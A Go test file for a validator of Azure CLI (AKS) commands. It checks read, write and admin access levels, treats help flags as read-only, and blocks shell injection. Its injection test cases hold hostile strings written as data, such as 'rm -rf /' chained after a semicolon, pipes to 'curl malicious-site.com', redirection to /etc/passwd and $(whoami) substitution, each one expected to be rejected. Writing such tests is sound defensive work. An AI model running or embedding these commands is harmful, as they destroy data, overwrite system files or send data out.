package security

import (
	"strings"
	"testing"
)

func TestValidateCommand(t *testing.T) {
	tests := []struct {
		name        string
		accessLevel string
		command     string
		wantErr     bool
	}{
		{
			name:        "ReadOnly_ReadCommand_ShouldSucceed",
			accessLevel: "readonly",
			command:     "az aks show --name myCluster --resource-group myRG",
			wantErr:     false,
		},
		{
			name:        "ReadOnly_WriteCommand_ShouldFail",
			accessLevel: "readonly",
			command:     "az aks create --name myCluster --resource-group myRG",
			wantErr:     true,
		},
		{
			name:        "ReadWrite_ReadCommand_ShouldSucceed",
			accessLevel: "readwrite",
			command:     "az aks show --name myCluster --resource-group myRG",
			wantErr:     false,
		},
		{
			name:        "ReadWrite_WriteCommand_ShouldSucceed",
			accessLevel: "readwrite",
			command:     "az aks create --name myCluster --resource-group myRG",
			wantErr:     false,
		},
		{
			name:        "Admin_ReadCommand_ShouldSucceed",
			accessLevel: "admin",
			command:     "az aks show --name myCluster --resource-group myRG",
			wantErr:     false,
		},
		{
			name:        "Admin_WriteCommand_ShouldSucceed",
			accessLevel: "admin",
			command:     "az aks create --name myCluster --resource-group myRG",
			wantErr:     false,
		},
		{
			name:        "Admin_AdminCommand_ShouldSucceed",
			accessLevel: "admin",
			command:     "az aks get-credentials --name myCluster --resource-group myRG",
			wantErr:     false,
		},
		{
			name:        "PartialCommand_ShouldMatch",
			accessLevel: "readonly",
			command:     "az version",
			wantErr:     false,
		},
		{
			name:        "AccountCommands_ShouldWork",
			accessLevel: "readonly",
			command:     "az account list",
			wantErr:     false,
		},
		{
			name:        "MonitorMetrics_ListCommand_ShouldWork",
			accessLevel: "readonly",
			command:     "az monitor metrics list --resource /subscriptions/test/resourceGroups/rg/providers/Microsoft.ContainerService/managedClusters/cluster",
			wantErr:     false,
		},
		{
			name:        "MonitorMetrics_ListDefinitionsCommand_ShouldWork",
			accessLevel: "readonly",
			command:     "az monitor metrics list-definitions --resource /subscriptions/test/resourceGroups/rg/providers/Microsoft.ContainerService/managedClusters/cluster",
			wantErr:     false,
		},
		{
			name:        "MonitorMetrics_ListNamespacesCommand_ShouldWork",
			accessLevel: "readonly",
			command:     "az monitor metrics list-namespaces --resource /subscriptions/test/resourceGroups/rg/providers/Microsoft.ContainerService/managedClusters/cluster",
			wantErr:     false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			secConfig := &SecurityConfig{
				AccessLevel: tt.accessLevel,
			}
			validator := NewValidator(secConfig)
			err := validator.ValidateCommand(tt.command, CommandTypeAz)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateCommand() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

func TestIsReadOperation(t *testing.T) {
	tests := []struct {
		name      string
		command   string
		allowList []string
		want      bool
	}{
		{
			name:      "ExactMatch",
			command:   "az aks show --name myCluster",
			allowList: []string{"az aks show", "az aks list"},
			want:      true,
		},
		{
			name:      "NoMatch",
			command:   "az aks create --name myCluster",
			allowList: []string{"az aks show", "az aks list"},
			want:      false,
		},
		{
			name:      "PrefixMatch",
			command:   "az account list",
			allowList: []string{"az account", "az aks show"},
			want:      true,
		},
		{
			name:      "TwoWordCommand",
			command:   "az version",
			allowList: []string{"az version", "az help"},
			want:      true,
		},
		{
			name:      "NonAzCommand",
			command:   "kubectl get pods",
			allowList: []string{"az aks show", "az aks list"},
			want:      false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			validator := NewValidator(&SecurityConfig{})
			if got := validator.isReadOperation(tt.command, tt.allowList); got != tt.want {
				t.Errorf("isReadOperation() = %v, want %v", got, tt.want)
			}
		})
	}
}

func TestAccessLevelValidation(t *testing.T) {
	// Setup common allowed operations
	readOps := []string{"az aks show", "az aks list"}

	tests := []struct {
		name        string
		accessLevel string
		command     string
		wantErr     bool
	}{
		{
			name:        "ReadOnly_ReadCommand",
			accessLevel: "readonly",
			command:     "az aks show --name myCluster",
			wantErr:     false,
		},
		{
			name:        "ReadOnly_WriteCommand",
			accessLevel: "readonly",
			command:     "az aks create --name myCluster",
			wantErr:     true,
		},
		{
			name:        "ReadWrite_ReadCommand",
			accessLevel: "readwrite",
			command:     "az aks show --name myCluster",
			wantErr:     false,
		},
		{
			name:        "ReadWrite_WriteCommand",
			accessLevel: "readwrite",
			command:     "az aks create --name myCluster",
			wantErr:     false,
		},
		{
			name:        "Admin_ReadCommand",
			accessLevel: "admin",
			command:     "az aks show --name myCluster",
			wantErr:     false,
		},
		{
			name:        "Admin_WriteCommand",
			accessLevel: "admin",
			command:     "az aks create --name myCluster",
			wantErr:     false,
		},
		{
			name:        "Unknown_ReadCommand",
			accessLevel: "unknown",
			command:     "az aks show --name myCluster",
			wantErr:     false, // Default to readwrite behavior
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			secConfig := &SecurityConfig{
				AccessLevel: tt.accessLevel,
			}
			validator := NewValidator(secConfig)
			err := validator.validateAccessLevel(tt.command, readOps)
			if (err != nil) != tt.wantErr {
				t.Errorf("validateAccessLevel() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

func TestIsReadOperation_HelpFlags(t *testing.T) {
	tests := []struct {
		name     string
		command  string
		expected bool
	}{
		{
			name:     "create with --help should be read-only",
			command:  "az aks create --help",
			expected: true,
		},
		{
			name:     "delete with -h should be read-only",
			command:  "az aks delete -h",
			expected: true,
		},
		{
			name:     "nodepool add with --help should be read-only",
			command:  "az aks nodepool add --help",
			expected: true,
		},
		{
			name:     "command ending with -h should be read-only",
			command:  "az aks create -h",
			expected: true,
		},
		{
			name:     "command with -h in middle should be read-only",
			command:  "az aks create -h --name test",
			expected: true,
		},
		{
			name:     "command with --help in middle should be read-only",
			command:  "az aks nodepool delete --help --cluster-name test",
			expected: true,
		},
		{
			name:     "command with -h as part of argument value should not be read-only",
			command:  "az aks create --name cluster-h --resource-group rg",
			expected: false,
		},
		{
			name:     "command with help substring in argument should not be read-only",
			command:  "az aks create --name helpful-cluster --resource-group rg",
			expected: false,
		},
	}

	validator := NewValidator(&SecurityConfig{})
	// Use minimal allowed operations for testing
	allowedOps := []string{"az aks show", "az aks list"}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := validator.isReadOperation(tt.command, allowedOps)
			if result != tt.expected {
				t.Errorf("isReadOperation(%q) = %v, expected %v", tt.command, result, tt.expected)
			}
		})
	}
}

func TestIsReadOperation_TrustedAccessCommands(t *testing.T) {
	validator := NewValidator(&SecurityConfig{})

	// Get the actual read operations from the validator
	readOps := AzReadOperations

	tests := []struct {
		name     string
		command  string
		expected bool
	}{
		{
			name:     "trustedaccess rolebinding list should be read-only",
			command:  "az aks trustedaccess rolebinding list",
			expected: true,
		},
		{
			name:     "trustedaccess rolebinding list with args should be read-only",
			command:  "az aks trustedaccess rolebinding list --cluster-name test --resource-group rg",
			expected: true,
		},
		{
			name:     "trustedaccess rolebinding show should be read-only",
			command:  "az aks trustedaccess rolebinding show",
			expected: true,
		},
		{
			name:     "trustedaccess rolebinding show with args should be read-only",
			command:  "az aks trustedaccess rolebinding show --cluster-name test --name binding",
			expected: true,
		},
		{
			name:     "trustedaccess rolebinding create should not be read-only",
			command:  "az aks trustedaccess rolebinding create --cluster-name test",
			expected: false,
		},
		{
			name:     "trustedaccess rolebinding delete should not be read-only",
			command:  "az aks trustedaccess rolebinding delete --cluster-name test",
			expected: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := validator.isReadOperation(tt.command, readOps)
			if result != tt.expected {
				t.Errorf("isReadOperation(%q) = %v, expected %v", tt.command, result, tt.expected)

				// Debug: let's see what base command is being extracted
				cmdParts := strings.Fields(tt.command)
				var baseCommand string
				if len(cmdParts) >= 3 && cmdParts[0] == CommandTypeAz {
					baseCommand = strings.Join(cmdParts[:3], " ")
				}
				t.Logf("Extracted base command: %q", baseCommand)

				// Check if it's in the allowed operations
				found := false
				for _, allowed := range readOps {
					if baseCommand == allowed || strings.HasPrefix(baseCommand, allowed) {
						found = true
						t.Logf("Matched against allowed operation: %q", allowed)
						break
					}
				}
				if !found {
					t.Logf("No match found in allowed operations")
				}
			}
		})
	}
}

func TestIsReadOperation_MonitorMetricsCommands(t *testing.T) {
	validator := NewValidator(&SecurityConfig{})
	readOps := AzReadOperations

	tests := []struct {
		name     string
		command  string
		expected bool
	}{
		{
			name:     "monitor metrics list should be read-only",
			command:  "az monitor metrics list --resource /subscriptions/test/resourceGroups/rg/providers/Microsoft.ContainerService/managedClusters/cluster",
			expected: true,
		},
		{
			name:     "monitor metrics list-definitions should be read-only",
			command:  "az monitor metrics list-definitions --resource /subscriptions/test/resourceGroups/rg/providers/Microsoft.ContainerService/managedClusters/cluster",
			expected: true,
		},
		{
			name:     "monitor metrics list-namespaces should be read-only",
			command:  "az monitor metrics list-namespaces --resource /subscriptions/test/resourceGroups/rg/providers/Microsoft.ContainerService/managedClusters/cluster",
			expected: true,
		},
		{
			name:     "monitor metrics list with minimal args should be read-only",
			command:  "az monitor metrics list --resource /test/resource",
			expected: true,
		},
		{
			name:     "monitor metrics list-definitions with minimal args should be read-only",
			command:  "az monitor metrics list-definitions --resource /test/resource",
			expected: true,
		},
		{
			name:     "monitor metrics list-namespaces with minimal args should be read-only",
			command:  "az monitor metrics list-namespaces --resource /test/resource",
			expected: true,
		},
		{
			name:     "monitor metrics create should not be read-only",
			command:  "az monitor metrics create --resource /test/resource",
			expected: false,
		},
		{
			name:     "monitor metrics delete should not be read-only",
			command:  "az monitor metrics delete --resource /test/resource",
			expected: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := validator.isReadOperation(tt.command, readOps)
			if result != tt.expected {
				t.Errorf("isReadOperation(%q) = %v, expected %v", tt.command, result, tt.expected)

				// Debug: let's see what base command is being extracted
				cmdParts := strings.Fields(tt.command)
				var baseCommand string
				if len(cmdParts) >= 4 && cmdParts[0] == CommandTypeAz {
					baseCommand = strings.Join(cmdParts[:4], " ")
				}
				t.Logf("Extracted base command: %q", baseCommand)

				// Check if it's in the allowed operations
				found := false
				for _, allowed := range readOps {
					if strings.HasPrefix(allowed, "az monitor metrics") {
						t.Logf("Found monitor metrics allowed operation: %q", allowed)
						if strings.HasPrefix(tt.command, allowed) {
							found = true
							t.Logf("Matched against allowed operation: %q", allowed)
							break
						}
					}
				}
				if !found {
					t.Logf("No match found in monitor metrics allowed operations")
				}
			}
		})
	}
}

func TestIsReadOperation_LongCommands(t *testing.T) {
	validator := NewValidator(&SecurityConfig{})
	readOps := AzReadOperations

	tests := []struct {
		name     string
		command  string
		expected bool
	}{
		{
			name:     "check-network outbound should be read-only",
			command:  "az aks check-network outbound --name test --resource-group rg",
			expected: true,
		},
		{
			name:     "nodepool get-upgrades should be read-only",
			command:  "az aks nodepool get-upgrades --cluster-name test --name pool1",
			expected: true,
		},
		{
			name:     "addon list should be read-only",
			command:  "az aks addon list --name test --resource-group rg",
			expected: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := validator.isReadOperation(tt.command, readOps)
			if result != tt.expected {
				t.Errorf("isReadOperation(%q) = %v, expected %v", tt.command, result, tt.expected)
			}
		})
	}
}

func TestValidateCommand_WithHelpFlags(t *testing.T) {
	tests := []struct {
		name        string
		accessLevel string
		command     string
		expectError bool
	}{
		{
			name:        "readonly mode allows write commands with --help",
			accessLevel: "readonly",
			command:     "az aks create --help",
			expectError: false,
		},
		{
			name:        "readonly mode allows write commands with -h",
			accessLevel: "readonly",
			command:     "az aks delete -h",
			expectError: false,
		},
		{
			name:        "readonly mode allows nodepool commands with --help",
			accessLevel: "readonly",
			command:     "az aks nodepool add --help",
			expectError: false,
		},
		{
			name:        "readonly mode blocks write commands without help",
			accessLevel: "readonly",
			command:     "az aks create --name test",
			expectError: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			validator := NewValidator(&SecurityConfig{AccessLevel: tt.accessLevel})
			err := validator.ValidateCommand(tt.command, CommandTypeAz)

			if tt.expectError && err == nil {
				t.Errorf("Expected error but got none for command: %q", tt.command)
			}
			if !tt.expectError && err != nil {
				t.Errorf("Expected no error but got: %v for command: %q", err, tt.command)
			}
		})
	}
}

func TestSpecificTrustedAccessFix(t *testing.T) {
	validator := NewValidator(&SecurityConfig{})
	readOps := AzReadOperations

	// Test the specific case that was failing
	command := "az aks trustedaccess rolebinding list --cluster-name test"
	result := validator.isReadOperation(command, readOps)

	if !result {
		t.Errorf("Expected trustedaccess rolebinding list to be read-only, but got false")

		// Debug output
		cmdParts := strings.Fields(command)
		t.Logf("Command parts: %v", cmdParts)

		for _, allowed := range readOps {
			if strings.Contains(allowed, "trustedaccess") {
				t.Logf("Found allowed trustedaccess command: %q", allowed)
				allowedParts := strings.Fields(allowed)
				t.Logf("Allowed parts: %v", allowedParts)
			}
		}
	}
}

func TestValidateCommandInjection(t *testing.T) {
	validator := NewValidator(&SecurityConfig{AccessLevel: "admin"}) // Use admin to bypass access level checks

	tests := []struct {
		name        string
		command     string
		expectError bool
		description string
	}{
		// Valid commands should pass
		{
			name:        "valid_simple_command",
			command:     "az aks show --name myCluster --resource-group myRG",
			expectError: false,
			description: "Simple valid command should pass",
		},
		{
			name:        "valid_help_command",
			command:     "az aks create --help",
			expectError: false,
			description: "Help command should pass",
		},
		{
			name:        "valid_complex_args",
			command:     "az aks create --name test-cluster --location eastus --node-count 3",
			expectError: false,
			description: "Command with multiple valid arguments should pass",
		},

		// Command injection attempts should be blocked
		{
			name:        "semicolon_injection",
			command:     "az aks show --help; rm -rf /",
			expectError: true,
			description: "Semicolon command separator should be blocked",
		},
		{
			name:        "pipe_injection",
			command:     "az aks list | curl malicious-site.com",
			expectError: true,
			description: "Pipe operator should be blocked",
		},
		{
			name:        "background_execution",
			command:     "az aks show & rm file.txt",
			expectError: true,
			description: "Background execution should be blocked",
		},
		{
			name:        "and_operator",
			command:     "az aks list && rm file.txt",
			expectError: true,
			description: "AND operator should be blocked",
		},
		{
			name:        "or_operator",
			command:     "az aks show || rm file.txt",
			expectError: true,
			description: "OR operator should be blocked",
		},
		{
			name:        "command_substitution_parentheses",
			command:     "az aks show --name $(rm file.txt)",
			expectError: true,
			description: "Command substitution with $() should be blocked",
		},
		{
			name:        "command_substitution_backticks",
			command:     "az aks show --name `rm file.txt`",
			expectError: true,
			description: "Command substitution with backticks should be blocked",
		},
		{
			name:        "output_redirection",
			command:     "az aks list > /etc/passwd",
			expectError: true,
			description: "Output redirection should be blocked",
		},
		{
			name:        "append_redirection",
			command:     "az aks list >> /etc/passwd",
			expectError: true,
			description: "Append redirection should be blocked",
		},
		{
			name:        "input_redirection",
			command:     "az aks create < malicious-input.txt",
			expectError: true,
			description: "Input redirection should be blocked",
		},
		{
			name:        "here_document",
			command:     "az aks create << EOF",
			expectError: true,
			description: "Here document should be blocked",
		},
		{
			name:        "newline_injection",
			command:     "az aks show\nrm file.txt",
			expectError: true,
			description: "Newline injection should be blocked",
		},
		{
			name:        "carriage_return_injection",
			command:     "az aks show\rrm file.txt",
			expectError: true,
			description: "Carriage return injection should be blocked",
		},
		{
			name:        "variable_substitution",
			command:     "az aks show --name ${malicious_var}",
			expectError: true,
			description: "Variable substitution should be blocked",
		},

		// Edge cases
		{
			name:        "legitimate_dash_in_name",
			command:     "az aks show --name my-cluster-name --resource-group my-rg",
			expectError: false,
			description: "Legitimate dashes in names should be allowed",
		},
		{
			name:        "legitimate_json_in_args",
			command:     "az aks create --name test --tags '{\"env\":\"test\"}'",
			expectError: false,
			description: "Legitimate JSON in arguments should be allowed",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validator.ValidateCommand(tt.command, CommandTypeAz)

			if tt.expectError && err == nil {
				t.Errorf("Expected error for %s: %s", tt.description, tt.command)
			}
			if !tt.expectError && err != nil {
				t.Errorf("Unexpected error for %s: %v (command: %s)", tt.description, err, tt.command)
			}
		})
	}
}

func TestValidateCommandInjection_IsolatedFunction(t *testing.T) {
	validator := NewValidator(&SecurityConfig{})

	tests := []struct {
		name        string
		command     string
		expectError bool
	}{
		{"valid_command", "az aks show --name test", false},
		{"semicolon_injection", "az aks show; rm file", true},
		{"pipe_injection", "az aks list | cat", true},
		{"and_injection", "az aks show && rm file", true},
		{"or_injection", "az aks show || rm file", true},
		{"command_substitution", "az aks show $(echo test)", true},
		{"backtick_substitution", "az aks show `echo test`", true},
		{"output_redirect", "az aks list > file.txt", true},
		{"append_redirect", "az aks list >> file.txt", true},
		{"input_redirect", "az aks create < input.txt", true},
		{"here_doc", "az aks create << EOF", true},
		{"newline", "az aks show\necho test", true},
		{"carriage_return", "az aks show\recho test", true},
		{"variable_substitution", "az aks show ${var}", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validator.validateCommandInjection(tt.command)

			if tt.expectError && err == nil {
				t.Errorf("validateCommandInjection(%q) expected error but got none", tt.command)
			}
			if !tt.expectError && err != nil {
				t.Errorf("validateCommandInjection(%q) unexpected error: %v", tt.command, err)
			}
		})
	}
}

func TestValidateCommandInjection_HereDocuments(t *testing.T) {
	validator := NewValidator(&SecurityConfig{})

	tests := []struct {
		name        string
		command     string
		expectError bool
	}{
		{
			name:        "here document should be allowed",
			command:     "az aks create --name test << EOF",
			expectError: false,
		},
		{
			name:        "here document with JSON payload should be allowed",
			command:     "az aks create --name test --resource-group rg << EOF\n{\"key\": \"value\"}\nEOF",
			expectError: false, // Newlines are allowed in here document context
		},
		{
			name:        "here document without newlines should be allowed",
			command:     "az aks create --name test --resource-group rg << EOF",
			expectError: false,
		},
		{
			name:        "single input redirection should be blocked",
			command:     "az aks show < malicious_file",
			expectError: true,
		},
		{
			name:        "mixed here document and single redirection should be blocked",
			command:     "az aks create << EOF < malicious_file",
			expectError: true,
		},
		{
			name:        "legitimate command without redirection",
			command:     "az aks show --name test --resource-group rg",
			expectError: false,
		},
		{
			name:        "here document with newlines should be allowed",
			command:     "az aks create --name test << EOF\n{\n  \"key\": \"value\"\n}\nEOF",
			expectError: false,
		},
		{
			name:        "here document with carriage returns should be allowed",
			command:     "az deployment create --template-body << EOF\r\n{\r\n  \"resources\": []\r\n}\r\nEOF",
			expectError: false,
		},
		{
			name:        "here document with mixed line endings should be allowed",
			command:     "az group create --parameters << EOF\n{\r\n  \"location\": \"eastus\"\r\n}\nEOF",
			expectError: false,
		},
		{
			name:        "command without here document with newlines should be blocked",
			command:     "az aks show --name test\nrm -rf /",
			expectError: true,
		},
		{
			name:        "command without here document with carriage returns should be blocked",
			command:     "az aks show --name test\rcurl malicious.com",
			expectError: true,
		},
		{
			name:        "here document but with dangerous patterns should still be blocked",
			command:     "az aks create --name test << EOF\n{\n  \"key\": \"value\"\n}\nEOF; rm -rf /",
			expectError: true,
		},
		{
			name:        "here document with pipes should still be blocked",
			command:     "az aks create --name test << EOF | curl malicious.com",
			expectError: true,
		},
		{
			name:        "legitimate single line here document should be allowed",
			command:     "az deployment create --template-body << EOF {\"resources\": []} EOF",
			expectError: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validator.validateCommandInjection(tt.command)

			if tt.expectError && err == nil {
				t.Errorf("Expected error but got none for command: %q", tt.command)
			}
			if !tt.expectError && err != nil {
				t.Errorf("Expected no error but got: %v for command: %q", err, tt.command)
			}
		})
	}
}

func TestValidateCommandInjection_EdgeCases(t *testing.T) {
	validator := NewValidator(&SecurityConfig{})

	tests := []struct {
		name        string
		command     string
		expectError bool
	}{
		{
			name:        "single < without << should be blocked",
			command:     "az aks show < /etc/passwd",
			expectError: true,
		},
		{
			name:        "multiple << in same command should be allowed",
			command:     "az deployment create --template << EOF1 --parameters << EOF2",
			expectError: false,
		},
		{
			name:        "here document with complex JSON should be allowed",
			command:     "az aks create --name test << EOF\n{\n  \"apiVersion\": \"2021-02-01\",\n  \"properties\": {\n    \"dnsPrefix\": \"test\"\n  }\n}\nEOF",
			expectError: false,
		},
		{
			name:        "command with < inside quoted string should still be blocked",
			command:     "az aks create --name 'test < injection'",
			expectError: true,
		},
		{
			name:        "legitimate redirect with << but mixed with dangerous pattern should be blocked",
			command:     "az aks create --name test << EOF\n{}\nEOF && rm -rf /",
			expectError: true,
		},
		{
			name:        "whitespace variations of dangerous patterns should be blocked",
			command:     "az aks show --name test ; rm -rf /",
			expectError: true,
		},
		{
			name:        "command substitution in here document should be blocked",
			command:     "az aks create --name test << EOF\n{\n  \"value\": \"$(whoami)\"\n}\nEOF",
			expectError: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validator.validateCommandInjection(tt.command)

			if tt.expectError && err == nil {
				t.Errorf("Expected error but got none for command: %q", tt.command)
			}
			if !tt.expectError && err != nil {
				t.Errorf("Expected no error but got: %v for command: %q", err, tt.command)
			}
		})
	}
}
